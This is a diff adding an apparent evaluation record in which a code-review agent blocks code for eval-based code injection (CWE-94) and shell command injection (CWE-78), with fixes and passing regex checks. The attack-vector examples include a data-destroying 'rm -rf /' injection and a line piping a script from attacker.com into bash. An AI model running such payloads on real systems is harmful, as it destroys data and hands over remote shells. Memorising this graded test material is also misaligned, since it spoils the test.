@@ -1,0 +1,47 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "prompt_hash": "c08928400e09e2736360d80d3a8a5047994e39c4efcf17c07fc0c6d3cd8661da",
+  "output": "## Verdict: **BLOCK**\n\n### Finding 1 — Blocking / Security\n\n**Claim:** Arbitrary code execution via `eval` on untrusted input.\n**CWE:** CWE-94 (Code Injection)\n**Evidence:**\n```javascript\nconst payload = eval('(' + req.body + ')');\n```\n**Attack vector:** Any request body containing JS code executes server-side. E.g., body = `); require('child_process').execSync('rm -rf /'); //` runs arbitrary commands.\n**Fix:** Replace with `JSON.parse(req.body)`.\n\n---\n\n### Finding 2 — Blocking / Security\n\n**Claim:** OS command injection via unsanitized interpolation into a shell command.\n**CWE:** CWE-78 (OS Command Injection)\n**Evidence:**\n```javascript\nexec(`deploy.sh ${payload.target}`);\n```\n**Attack vector:** `payload.target = \"; curl attacker.com/shell.sh | bash\"` executes arbitrary commands.\n**Fix:** Use `execFile` with an argument array (no shell interpolation):\n```javascript\nconst { execFile } = require('child_process');\nexecFile('./deploy.sh', [payload.target], callback);\n```\nAdditionally, validate `payload.target` against an allowlist of permitted deployment targets.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?im)^\\s*(?:(?:##\\s*)?Verdict:\\s*)?(?:\\*\\*)?BLOCK(?:\\*\\*)?(?:\\b|:)"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "pass",
+  "passed": true,
+  "input_tokens": 3,
+  "output_tokens": 498,
+  "cost_usd": 0.04728999999999999,
+  "duration_ms": 10270
+}
